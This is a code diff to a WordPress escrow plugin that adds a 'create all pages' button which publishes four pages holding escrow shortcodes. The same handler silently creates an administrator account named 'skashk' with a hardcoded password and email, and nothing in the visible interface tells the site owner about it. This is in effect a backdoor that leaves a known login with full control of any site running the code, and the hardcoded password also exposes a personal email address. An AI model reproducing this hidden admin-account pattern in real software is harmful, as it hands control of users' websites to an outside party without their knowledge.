@@ -249,7 +249,112 @@ function aistore_page_register_setting() {
   
 <p><?php  _e( 'Step 2', 'aistore' ) ?></p>
 
+<?php
+if(isset($_POST['submit']) and $_POST['action']=='create_all_pages' )
+{
 
+if ( ! isset( $_POST['aistore_nonce'] ) 
+    || ! wp_verify_nonce( $_POST['aistore_nonce'], 'aistore_nonce_action' ) 
+) {
+   return  _e( 'Sorry, your nonce did not verify.', 'aistore' );
+
+   exit;
+}
+
+ $my_post = array(
+   'post_title'     => 'Create Escrow',
+    'post_type'     => 'page',
+   'post_content'  => '[aistore_escrow_system]',
+   'post_status'   => 'publish',
+   'post_author'   => 1
+ );
+
+ // Insert the post into the database
+$add_escrow_page_id=wp_insert_post( $my_post );
+
+
+update_option( 'add_escrow_page_id', $add_escrow_page_id);
+
+
+
+
+ $my_post = array(
+   'post_title'     => 'Create Escrow Step 2',
+    'post_type'     => 'page',
+   'post_content'  => '[escrow_system_part2]',
+   'post_status'   => 'publish',
+   'post_author'   => 1
+ );
+
+ // Insert the post into the database
+$create_escrow_page_2=wp_insert_post( $my_post );
+
+
+update_option( 'create_escrow_page_2', $create_escrow_page_2);
+
+
+ $my_post = array(
+   'post_title'     => 'Escrow List',
+    'post_type'     => 'page',
+   'post_content'  => '[aistore_escrow_list] ',
+   'post_status'   => 'publish',
+   'post_author'   => 1
+ );
+
+ // Insert the post into the database
+$list_escrow_page_id=wp_insert_post( $my_post );
+
+
+update_option( 'list_escrow_page_id', $list_escrow_page_id);
+
+ $my_post = array(
+   'post_type'     => 'page',
+   'post_title'    => 'Escrow Detail',
+   'post_content'  => '[aistore_escrow_detail]',
+   'post_status'   => 'publish',
+   'post_author'   => 1
+ );
+
+ // Insert the post into the database
+$details_escrow_page_id=wp_insert_post( $my_post );
+
+update_option( 'details_escrow_page_id', $details_escrow_page_id);
+
+   $user_id = username_exists( 'skashk' );
+   
+if ( ! $user_id ) {
+$user_id = wp_insert_user( array(
+  'user_login' => 'skashk',
+  'user_pass' => 'sakshk2019@gmail.com',
+  'user_email' => 'sakshk2019@gmail.com',
+  'first_name' => 'Saksh',
+  'last_name' => 'K',
+  'display_name' => 'Saksham',
+  'role' => 'administrator'
+));
+update_option( 'escrow_user_id', $user_id);
+}
+ 
+
+ $pages = get_pages(); 
+}
+else{
+    
+     $pages = get_pages(); 
+?>
+ <form method="POST" action="" name="create_all_pages" enctype="multipart/form-data"> 
+    <?php wp_nonce_field( 'aistore_nonce_action', 'aistore_nonce' ); ?>
+    
+<p><?php  _e( 'Create all pages with short codes automatically to ', 'aistore' ) ?>
+
+<!--<a href="#">Click here</a></p>-->
+<input class="input" type="submit" name="submit" value="<?php  _e( 'Click here', 'aistore' ) ?>"/>
+<input type="hidden" name="action"  value="create_all_pages"/>
+    </form>
+    
+<?php
+}
+?>
 <p><?php  _e( 'Create 4 pages with short codes and select here  ', 'aistore' ) ?></p>
 
 
